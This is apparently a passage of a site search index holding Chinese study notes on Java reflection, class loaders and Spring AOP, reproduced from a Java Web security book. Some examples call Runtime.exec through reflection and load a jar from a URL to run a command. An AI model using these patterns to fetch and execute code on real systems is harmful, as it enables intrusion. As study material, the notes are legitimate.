...","title":"\u53cd\u5c04\u673a\u5236"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u83b7\u53d6class\u5bf9\u8c61","text":"\u6709\u4e09\u79cd\u65b9\u6cd5\u83b7\u53d6Class\u5bf9\u8c61\uff1a 1. \u7c7b\u540d.class 2. Class.forName(\"\") 3. classLoader.loadClass(\"\"); \u83b7\u53d6\u6570\u7ec4\u7c7b\u578b\u7684Class\u5bf9\u8c61\u6bd4\u8f83\u7279\u6b8a\uff1a Class <?> doubleArray = Class . forName ( \"[D\" ); //\u76f8\u5f53\u4e8edouble[].class Class <?> cStringArray = Class . forName ( \"[[Ljava.lang.String;\" ); // \u76f8\u5f53\u4e8eString[][].class","title":"\u83b7\u53d6Class\u5bf9\u8c61"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u53cd\u5c04\u83b7\u53d6javalangruntime","text":"package top.longlone ; import sun.misc.IOUtils ; import java.io.InputStream ; import java.lang.reflect.Constructor ; import java.lang.reflect.Method ; public class ReflectionStudy { public static void main ( String [] args ) throws Exception { // \u53cd\u5c04\u83b7\u53d6Runtime\u7c7b Class <?> runtimeClass = Class . forName ( \"java.lang.Runtime\" ); // \u53cd\u5c04\u83b7\u53d6\u7c7b\u7684\u6784\u9020\u5668\uff0c\u56e0\u4e3a\u5b83\u662f\u79c1\u6709\u7684\u6240\u4ee5\u8981\u8bbe\u7f6eAccessible Constructor <?> constructor = runtimeClass . getDeclaredConstructor (); constructor . setAccessible ( true ); // \u83b7\u53d6Runtime\u5b9e\u4f8b Object runtimeInstance = constructor . newInstance (); // \u83b7\u53d6exec\u65b9\u6cd5 Method exec = runtimeClass . getMethod ( \"exec\" , String . class ); // \u53cd\u5c04\u8c03\u7528exec\u65b9\u6cd5\u5e76\u83b7\u53d6\u7ed3\u679c Process process = ( Process ) exec . invoke ( runtimeInstance , \"whoami\" ); InputStream inputStream = process . getInputStream (); System . out . println ( new String ( IOUtils . readAllBytes ( inputStream ))); } }","title":"\u53cd\u5c04\u83b7\u53d6java.lang.Runtime"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u53cd\u5c04\u8c03\u7528\u7c7b\u65b9\u6cd5","text":"","title":"\u53cd\u5c04\u8c03\u7528\u7c7b\u65b9\u6cd5"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u83b7\u53d6\u6210\u5458\u65b9\u6cd5","text":"\u83b7\u53d6\u5f53\u524d\u7c7b\u6240\u6709\u7684\u6210\u5458\u65b9\u6cd5\uff1a Method [] methods = clazz . getDeclaredMethods () \u83b7\u53d6\u5f53\u524d\u7c7b\u6307\u5b9a\u7684\u6210\u5458\u65b9\u6cd5\uff1a Method method = clazz . getDeclaredMethod ( \"\u65b9\u6cd5\u540d\" ); Method method = clazz . getDeclaredMethod ( \"\u65b9\u6cd5\u540d\" , \u53c2\u6570\u7c7b\u578b\u5982String . class \uff0c \u591a\u4e2a\u53c2\u6570\u7528 \",\" \u53f7\u9694\u5f00 );","title":"\u83b7\u53d6\u6210\u5458\u65b9\u6cd5"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#getmethod\u4e0egetdeclaredmethod\u7684\u533a\u522b","text":"getMethod \u80fd\u83b7\u53d6 \u5f53\u524d\u7c7b\u548c\u7236\u7c7b \u7684\u6240\u6709\u6709\u6743\u9650\u65b9\u6cd5\uff08\u5982public\uff09 getDeclaredMethod \u80fd\u83b7\u53d6 \u5f53\u524d\u7c7b \u7684\u6240\u6709\u65b9\u6cd5","title":"getMethod\u4e0egetDeclaredMethod\u7684\u533a\u522b"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u53cd\u5c04\u8c03\u7528\u7c7b\u65b9\u6cd5_1","text":"method . invoke ( \u65b9\u6cd5\u5b9e\u4f8b\u5bf9\u8c61 , \u65b9\u6cd5\u53c2\u6570\u503c \uff0c \u591a\u4e2a\u53c2\u6570\u503c\u7528 \",\" \u9694\u5f00 );","title":"\u53cd\u5c04\u8c03\u7528\u7c7b\u65b9\u6cd5"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u53cd\u5c04\u83b7\u53d6\u548c\u4fee\u6539\u5c5e\u6027","text":"","title":"\u53cd\u5c04\u83b7\u53d6\u548c\u4fee\u6539\u5c5e\u6027"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u83b7\u53d6\u5f53\u524d\u7c7b\u7684\u6240\u6709\u6210\u5458\u53d8\u91cf","text":"Field fields = clazz . getDeclaredFields ();","title":"\u83b7\u53d6\u5f53\u524d\u7c7b\u7684\u6240\u6709\u6210\u5458\u53d8\u91cf"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u83b7\u53d6\u5f53\u524d\u7c7b\u6307\u5b9a\u7684\u6210\u5458\u53d8\u91cf","text":"Field field = clazz . getDeclaredField ( \"\u53d8\u91cf\u540d\" ); getField \u548c getDeclaredField \u7684\u533a\u522b\u540c getMethod \u548c getDeclaredMethod","title":"\u83b7\u53d6\u5f53\u524d\u7c7b\u6307\u5b9a\u7684\u6210\u5458\u53d8\u91cf"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u83b7\u53d6\u6210\u5458\u53d8\u91cf\u503c","text":"Object obj = field . get ( \u7c7b\u5b9e\u4f8b\u5bf9\u8c61 );","title":"\u83b7\u53d6\u6210\u5458\u53d8\u91cf\u503c"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u4fee\u6539\u6210\u5458\u53d8\u91cf\u503c","text":"field . set ( \u7c7b\u5b9e\u4f8b\u5bf9\u8c61 , \u4fee\u6539\u540e\u7684\u503c );","title":"\u4fee\u6539\u6210\u5458\u53d8\u91cf\u503c"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u793a\u4f8b","text":"package top.longlone ; import java.lang.reflect.Constructor ; import java.lang.reflect.Field ; class NumberTest { private Integer number ; public NumberTest () { number = 1 ; } public void display () { System . out . println ( \"Number is \" + number ); } } public class ReflectionStudy { public static void main ( String [] args ) throws Exception { // \u83b7\u53d6NumberTest\u7c7b Class <?> testClass = Class . forName ( \"top.longlone.NumberTest\" ); // \u83b7\u53d6NumberTest\u4e2d\u7684number\u5c5e\u6027\u5e76\u8bbe\u7f6e\u53ef\u8bbf\u95ee\uff08\u56e0\u4e3a\u662f\u79c1\u6709\u7684\uff09 Field numberField = testClass . getDeclaredField ( \"number\" ); numberField . setAccessible ( true ); // \u83b7\u53d6NumberTest\u6784\u9020\u5668 Constructor <?> testConstructor = testClass . getConstructor (); // \u83b7\u53d6NumberTest\u5b9e\u4f8b NumberTest testInstance = ( NumberTest ) testConstructor . newInstance (); // \u83b7\u53d6\u5b9e\u4f8b\u4e2d\u7684number\u5c5e\u6027\u503c\uff0c\u6b64\u65f6\u4e3a1 Integer number = ( Integer ) numberField . get ( testInstance ); // \u8bbe\u7f6e\u5b9e\u4f8b\u4e2d\u7684number\u5c5e\u6027\u503c\u4e3a\u539f\u6765\u7684+1 numberField . set ( testInstance , number + 1 ); // \u8f93\u51fa\u7ed3\u679c\uff0c\u4e3a2 testInstance . display (); } }","title":"\u793a\u4f8b"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%A4%B4%E5%A3%B0%E6%98%8E/","text":"\u5f00\u5934\u58f0\u660e # \u8fd9\u4e2a\u5206\u7c7b\u4e0b\u7684\u6587\u7ae0\u5747\u6765\u81ea\u6211\u9605\u8bfb \u653b\u51fbJava Web\u5e94\u7528-[Java Web\u5b89\u5168] \u540e\u7684\u793a\u4f8b\u590d\u73b0\uff0c\u4fb5\u5220\u3002","title":"\u5f00\u5934\u58f0\u660e"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%A4%B4%E5%A3%B0%E6%98%8E/#\u5f00\u5934\u58f0\u660e","text":"\u8fd9\u4e2a\u5206\u7c7b\u4e0b\u7684\u6587\u7ae0\u5747\u6765\u81ea\u6211\u9605\u8bfb \u653b\u51fbJava Web\u5e94\u7528-[Java Web\u5b89\u5168] \u540e\u7684\u793a\u4f8b\u590d\u73b0\uff0c\u4fb5\u5220\u3002","title":"\u5f00\u5934\u58f0\u660e"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/","text":"\u7c7b\u52a0\u8f7d\u673a\u5236 # Java\u7a0b\u5e8f\u5728\u8fd0\u884c\u524d\u9700\u8981\u5148\u7f16\u8bd1\u6210 class\u6587\u4ef6 \uff0cJava\u7c7b\u521d\u59cb\u5316\u7684\u65f6\u5019\u4f1a\u8c03\u7528 java.lang.ClassLoader \u52a0\u8f7d\u7c7b\u5b57\u8282\u7801\uff0c ClassLoader \u4f1a\u8c03\u7528JVM\u7684native\u65b9\u6cd5( defineClass0/1/2 )\u6765\u5b9a\u4e49\u4e00\u4e2a java.lang.Class \u5b9e\u4f8b\u3002 ClassLoader # \u5305\u542b\u4ee5\u4e0b\u51e0\u4e2aClassLoader\uff1a - Bootstrap ClassLoader (\u5f15\u5bfc\u7c7b\u52a0\u8f7d\u5668) \u8be5\u7c7b\u52a0\u8f7d\u5668\u5b9e\u73b0\u4e8eJVM\u5c42\uff0c\u91c7\u7528C++\u7f16\u5199 - Extension ClassLoader (\u6269\u5c55\u7c7b\u52a0\u8f7d\u5668) - App ClassLoader (\u7cfb\u7edf\u7c7b\u52a0\u8f7d\u5668) \u9ed8\u8ba4\u7684\u7c7b\u52a0\u8f7d\u5668 ClassLoader\u7684\u6838\u5fc3\u65b9\u6cd5\u6709\uff1a 1. loadClass (\u52a0\u8f7d\u6307\u5b9a\u7684Java\u7c7b) 2. findClass (\u67e5\u627e\u6307\u5b9a\u7684Java\u7c7b) 3. findLoadedClass (\u67e5\u627eJVM\u5df2\u7ecf\u52a0\u8f7d\u8fc7\u7684\u7c7b) 4. defineClass (\u5b9a\u4e49\u4e00\u4e2aJava\u7c7b) 5. resolveClass (\u94fe\u63a5\u6307\u5b9a\u7684Java\u7c7b) \u7c7b\u52a0\u8f7d\u65b9\u5f0f # \u663e\u5f0f\u52a0\u8f7d # // \u53cd\u5c04\u52a0\u8f7dTestHelloWorld\u793a\u4f8b Class . forName ( \"top.longlone.TestHelloWorld\" ); // ClassLoader\u52a0\u8f7dTestHelloWorld\u793a\u4f8b this . getClass (). getClassLoader (). loadClass ( \"top.longlone.TestHelloWorld\" ); \u9690\u5f0f\u52a0\u8f7d # \u6307\u76f4\u63a5 \u7c7b\u540d.\u65b9\u6cd5\u540d() \u6216 new \u7c7b\u5b9e\u4f8b\u3002 \u7c7b\u52a0\u8f7d\u6d41\u7a0b # \u8c03\u7528 loadClass \u52a0\u8f7d \u8c03\u7528 findLoadedClass \u68c0\u67e5\u662f\u5426\u5df2\u52a0\u8f7d\uff0c\u82e5\u5df2\u52a0\u8f7d\u5219\u76f4\u63a5\u8fd4\u56de\u5df2\u52a0\u8f7d\u7684\u7c7b \u5982\u679c\u521b\u5efaClassLoader\u65f6\u4f20\u5165\u4e86\u7236\u7c7b\u52a0\u8f7d\u5668( new ClassLoader(\u7236\u7c7b\u52a0\u8f7d\u5668) )\u5219\u4f7f\u7528\u7236\u7c7b\u52a0\u8f7d\u5668\u5148\u52a0\u8f7d,\u5426\u5219\u4f7f\u7528JVM\u7684 Bootstrap ClassLoader \u52a0\u8f7d \u82e5\u7236\u7c7b\u52a0\u8f7d\u5668\u65e0\u6cd5\u52a0\u8f7d\u5219\u8c03\u7528\u81ea\u8eab findClass \u52a0\u8f7d \u5982\u679c\u8c03\u7528loadClass\u7684\u65f6\u5019\u4f20\u5165\u7684 resolve \u53c2\u6570\u4e3atrue\uff0c\u90a3\u4e48\u8fd8\u9700\u8981\u8c03\u7528 resolveClass \u65b9\u6cd5\u94fe\u63a5\u7c7b,\u9ed8\u8ba4\u4e3afalse \u52a0\u8f7d\u5931\u8d25\u6216\u8fd4\u56de\u52a0\u8f7d\u540e\u7684 java.lang.Class \u7c7b\u5bf9\u8c61 \u81ea\u5b9a\u4e49ClassLoader # package top.longlone ; import java.util.Base64 ; import java.lang.reflect.Method ; public class ClassLoaderStudy extends ClassLoader { private static final String testClassName = \"top.longlone.Hello\" ; // base64 -w Hello.class private static final byte [] testClassBytes = Base64 . getDecoder (). decode ( \"yv66vgAAADQAHAoACAARBwASCgACABEIABMKAAIAFAoAAgAVBwAWBwAXAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABWhlbGxvAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwACQAKAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAAZIZWxsbyAMABgAGQwAGgAbAQASdG9wL2xvbmdsb25lL0hlbGxvAQAQamF2YS9sYW5nL09iamVjdAEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsAIQAHAAgAAAAAAAIAAQAJAAoAAQALAAAAHQABAAEAAAAFKrcAAbEAAAABAAwAAAAGAAEAAAADAAEADQAOAAEACwAAACwAAgACAAAAFLsAAlm3AAMSBLYABSu2AAW2AAawAAAAAQAMAAAABgABAAAABQABAA8AAAACABA=\" ); @Override protected Class <?> findClass ( String name ) throws ClassNotFoundException { if ( name . equals ( testClassName )) { return defineClass ( testClassName , testClassBytes , 0 , testClassBytes . length ); } return super . findClass ( name ); } public static void main ( String [] args ) throws Exception { ClassLoaderStudy loader = new ClassLoaderStudy (); Class testClass = loader . loadClass ( testClassName ); Object o = testClass . newInstance (); Method sayHello = o . getClass (). getMethod ( \"hello\" , String . class ); String longlone = ( String ) sayHello . invoke ( o , \"Longlone\" ); System . out . println ( longlone ); } } URLClassLoader # package top.longlone ; import java.io.ByteArrayOutputStream ; import java.io.InputStream ; import java.net.URL ; import java.net.URLClassLoader ; public class ClassLoaderStudy { public static void main ( String [] args ) throws Exception { URL url = new URL ( \"http://127.0.0.1/cmd.jar\" ); URLClassLoader urlClassLoader = new URLClassLoader ( new URL [] { url }); String cmd = \"whoami\" ; Class <?> cmdClass = urlClassLoader . loadClass ( \"top.longlone.CMD\" ); Process process = ( Process ) cmdClass . getMethod ( \"exec\" , String . class ). invoke ( null , cmd ); InputStream inputStream = process . getInputStream (); ByteArrayOutputStream byteArrayInputStream = new ByteArrayOutputStream (); byte [] bytes = new byte [ 1024 ] ; int a = - 1 ; while (( a = inputStream . read ( bytes )) != - 1 ) { byteArrayInputStream . write ( bytes , 0 , a ); } System . out . println ( byteArrayInputStream . toString ()); } }","title":"\u7c7b\u52a0\u8f7d\u673a\u5236"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/#\u7c7b\u52a0\u8f7d\u673a\u5236","text":"Java\u7a0b\u5e8f\u5728\u8fd0\u884c\u524d\u9700\u8981\u5148\u7f16\u8bd1\u6210 class\u6587\u4ef6 \uff0cJava\u7c7b\u521d\u59cb\u5316\u7684\u65f6\u5019\u4f1a\u8c03\u7528 java.lang.ClassLoader \u52a0\u8f7d\u7c7b\u5b57\u8282\u7801\uff0c ClassLoader \u4f1a\u8c03\u7528JVM\u7684native\u65b9\u6cd5( defineClass0/1/2 )\u6765\u5b9a\u4e49\u4e00\u4e2a java.lang.Class \u5b9e\u4f8b\u3002","title":"\u7c7b\u52a0\u8f7d\u673a\u5236"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/#classloader","text":"\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2aClassLoader\uff1a - Bootstrap ClassLoader (\u5f15\u5bfc\u7c7b\u52a0\u8f7d\u5668) \u8be5\u7c7b\u52a0\u8f7d\u5668\u5b9e\u73b0\u4e8eJVM\u5c42\uff0c\u91c7\u7528C++\u7f16\u5199 - Extension ClassLoader (\u6269\u5c55\u7c7b\u52a0\u8f7d\u5668) - App ClassLoader (\u7cfb\u7edf\u7c7b\u52a0\u8f7d\u5668) \u9ed8\u8ba4\u7684\u7c7b\u52a0\u8f7d\u5668 ClassLoader\u7684\u6838\u5fc3\u65b9\u6cd5\u6709\uff1a 1. loadClass (\u52a0\u8f7d\u6307\u5b9a\u7684Java\u7c7b) 2. findClass (\u67e5\u627e\u6307\u5b9a\u7684Java\u7c7b) 3. findLoadedClass (\u67e5\u627eJVM\u5df2\u7ecf\u52a0\u8f7d\u8fc7\u7684\u7c7b) 4. defineClass (\u5b9a\u4e49\u4e00\u4e2aJava\u7c7b) 5. resolveClass (\u94fe\u63a5\u6307\u5b9a\u7684Java\u7c7b)","title":"ClassLoader"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/#\u7c7b\u52a0\u8f7d\u65b9\u5f0f","text":"","title":"\u7c7b\u52a0\u8f7d\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/#\u663e\u5f0f\u52a0\u8f7d","text":"// \u53cd\u5c04\u52a0\u8f7dTestHelloWorld\u793a\u4f8b Class . forName ( \"top.longlone.TestHelloWorld\" ); // ClassLoader\u52a0\u8f7dTestHelloWorld\u793a\u4f8b this . getClass (). getClassLoader (). loadClass ( \"top.longlone.TestHelloWorld\" );","title":"\u663e\u5f0f\u52a0\u8f7d"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/#\u9690\u5f0f\u52a0\u8f7d","text":"\u6307\u76f4\u63a5 \u7c7b\u540d.\u65b9\u6cd5\u540d() \u6216 new \u7c7b\u5b9e\u4f8b\u3002","title":"\u9690\u5f0f\u52a0\u8f7d"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/#\u7c7b\u52a0\u8f7d\u6d41\u7a0b","text":"\u8c03\u7528 loadClass \u52a0\u8f7d \u8c03\u7528 findLoadedClass \u68c0\u67e5\u662f\u5426\u5df2\u52a0\u8f7d\uff0c\u82e5\u5df2\u52a0\u8f7d\u5219\u76f4\u63a5\u8fd4\u56de\u5df2\u52a0\u8f7d\u7684\u7c7b \u5982\u679c\u521b\u5efaClassLoader\u65f6\u4f20\u5165\u4e86\u7236\u7c7b\u52a0\u8f7d\u5668( new ClassLoader(\u7236\u7c7b\u52a0\u8f7d\u5668) )\u5219\u4f7f\u7528\u7236\u7c7b\u52a0\u8f7d\u5668\u5148\u52a0\u8f7d,\u5426\u5219\u4f7f\u7528JVM\u7684 Bootstrap ClassLoader \u52a0\u8f7d \u82e5\u7236\u7c7b\u52a0\u8f7d\u5668\u65e0\u6cd5\u52a0\u8f7d\u5219\u8c03\u7528\u81ea\u8eab findClass \u52a0\u8f7d \u5982\u679c\u8c03\u7528loadClass\u7684\u65f6\u5019\u4f20\u5165\u7684 resolve \u53c2\u6570\u4e3atrue\uff0c\u90a3\u4e48\u8fd8\u9700\u8981\u8c03\u7528 resolveClass \u65b9\u6cd5\u94fe\u63a5\u7c7b,\u9ed8\u8ba4\u4e3afalse \u52a0\u8f7d\u5931\u8d25\u6216\u8fd4\u56de\u52a0\u8f7d\u540e\u7684 java.lang.Class \u7c7b\u5bf9\u8c61","title":"\u7c7b\u52a0\u8f7d\u6d41\u7a0b"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/#\u81ea\u5b9a\u4e49classloader","text":"package top.longlone ; import java.util.Base64 ; import java.lang.reflect.Method ; public class ClassLoaderStudy extends ClassLoader { private static final String testClassName = \"top.longlone.Hello\" ; // base64 -w Hello.class private static final byte [] testClassBytes = Base64 . getDecoder (). decode ( \"yv66vgAAADQAHAoACAARBwASCgACABEIABMKAAIAFAoAAgAVBwAWBwAXAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABWhlbGxvAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwACQAKAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAAZIZWxsbyAMABgAGQwAGgAbAQASdG9wL2xvbmdsb25lL0hlbGxvAQAQamF2YS9sYW5nL09iamVjdAEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsAIQAHAAgAAAAAAAIAAQAJAAoAAQALAAAAHQABAAEAAAAFKrcAAbEAAAABAAwAAAAGAAEAAAADAAEADQAOAAEACwAAACwAAgACAAAAFLsAAlm3AAMSBLYABSu2AAW2AAawAAAAAQAMAAAABgABAAAABQABAA8AAAACABA=\" ); @Override protected Class <?> findClass ( String name ) throws ClassNotFoundException { if ( name . equals ( testClassName )) { return defineClass ( testClassName , testClassBytes , 0 , testClassBytes . length ); } return super . findClass ( name ); } public static void main ( String [] args ) throws Exception { ClassLoaderStudy loader = new ClassLoaderStudy (); Class testClass = loader . loadClass ( testClassName ); Object o = testClass . newInstance (); Method sayHello = o . getClass (). getMethod ( \"hello\" , String . class ); String longlone = ( String ) sayHello . invoke ( o , \"Longlone\" ); System . out . println ( longlone ); } }","title":"\u81ea\u5b9a\u4e49ClassLoader"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/#urlclassloader","text":"package top.longlone ; import java.io.ByteArrayOutputStream ; import java.io.InputStream ; import java.net.URL ; import java.net.URLClassLoader ; public class ClassLoaderStudy { public static void main ( String [] args ) throws Exception { URL url = new URL ( \"http://127.0.0.1/cmd.jar\" ); URLClassLoader urlClassLoader = new URLClassLoader ( new URL [] { url }); String cmd = \"whoami\" ; Class <?> cmdClass = urlClassLoader . loadClass ( \"top.longlone.CMD\" ); Process process = ( Process ) cmdClass . getMethod ( \"exec\" , String . class ). invoke ( null , cmd ); InputStream inputStream = process . getInputStream (); ByteArrayOutputStream byteArrayInputStream = new ByteArrayOutputStream (); byte [] bytes = new byte [ 1024 ] ; int a = - 1 ; while (( a = inputStream . read ( bytes )) != - 1 ) { byteArrayInputStream . write ( bytes , 0 , a ); } System . out . println ( byteArrayInputStream . toString ()); } }","title":"URLClassLoader"},{"location":"%E5%AE%89%E5%85%A8/java/spring/AOP/","text":"AOP # AOP\u662fAspect Oriented Programming\uff0c\u5373\u9762\u5411\u5207\u9762\u7f16\u7a0b\u3002AOP\u662f\u4e00\u79cd\u65b0\u7684\u7f16\u7a0b\u65b9\u5f0f\uff0c\u5b83\u548cOOP\u4e0d\u540c\uff0cOOP\u628a\u7cfb\u7edf\u770b\u4f5c\u591a\u4e2a\u5bf9\u8c61\u7684\u4ea4\u4e92\uff0cAOP\u628a\u7cfb\u7edf\u5206\u89e3\u4e3a\u4e0d\u540c\u7684\u5173\u6ce8\u70b9\uff0c\u6216\u8005\u79f0\u4e4b\u4e3a\u5207\u9762\uff08Aspect\uff09\u3002 SpringAOP # \u5728SpringAOP\u4e2d\uff0c\u901a\u8fc7Advice\u5b9a\u4e49\u6a2a\u5207\u903b\u8f91\uff0cSpring\u652f\u63015\u79cd\u7c7b\u578b\u7684Advice: \u5bfc\u5165\u4f9d\u8d56 # \u8981\u5728Spring\u4e2d\u4f7f\u7528AOP\u7ec7\u5165\uff0c\u9700\u8981\u5bfc\u5165\u4ee5\u4e0b\u4f9d\u8d56 <dependency> <groupId> org.aspectj </groupId> <artifactId> aspectjweaver </artifactId> <version> 1.9.8.M1 </version> </dependency> \u5b9e\u73b0\u65b9\u5f0f\u4e00:\u539f\u751fSpirng API\u63a5\u53e3 # package top.longlone.service ; public interface UserService { public void add (); public void delete (); public void update (); public void query (); } package top.longlone.service ; import org.springframework.stereotype.Service ; public class UserServiceImpl implements UserService { @Override public void add () { System . out . println ( \"\u589e\u52a0\u4e00\u4e2a\u7528\u6237\" ); } @Override public void delete () { System . out . println ( \"\u5220\u9664\u4e00\u4e2a\u7528\u6237\" ); } @Override public void update () { System . out . println ( \"\u66f4\u65b0\u4e00\u4e2a\u7528\u6237\" ); } @Override public void query () { System . out . println ( \"\u67e5\u8be2\u4e00\u4e2a\u7528\u6237\" ); } } package top.longlone.log ; import org.springframework.aop.AfterReturningAdvice ; import org.springframework.aop.MethodBeforeAdvice ; import java.lang.reflect.Method ; public class Log implements MethodBeforeAdvice , AfterReturningAdvice { @Override public void before ( Method method , Object [] args , Object target ) throws Throwable { System . out . println ( target . getClass (). getName () + \"\u7684\" + method . getName () + \"\u6267\u884c\u4e4b\u524d\" ); } @Override public void afterReturning ( Object returnValue , Method method , Object [] args , Object target ) throws Throwable { System . out . println ( target . getClass (). getName () + \"\u7684\" + method . getName () + \"\u6267\u884c\u5b8c\u6bd5\" ); } } <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xmlns:aop= \"http://www.springframework.org/schema/aop\" xsi:schemaLocation= \" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\" > <bean id= \"userService\" class= \"top.longlone.service.UserServiceImpl\" /> <bean id= \"log\" class= \"top.longlone.log.Log\" /> <!-- \u65b9\u5f0f\u4e00:\u4f7f\u7528\u539f\u751fSpring API\u63a5\u53e3--> <!-- \u5bfc\u5165aop\uff0c\u9700\u8981\u5bfc\u5165aop\u7684\u7ea6\u675f --> <aop:config> <!-- \u589e\u52a0\u5207\u5165\u70b9\uff0cexpression:execution(\u4fee\u9970\u7b26 \u8fd4\u56de\u503c \u7c7b\u540d \u65b9\u6cd5\u540d \u53c2\u6570) --> <aop:pointcut id= \"pointcut\" expression= \"execution(public * 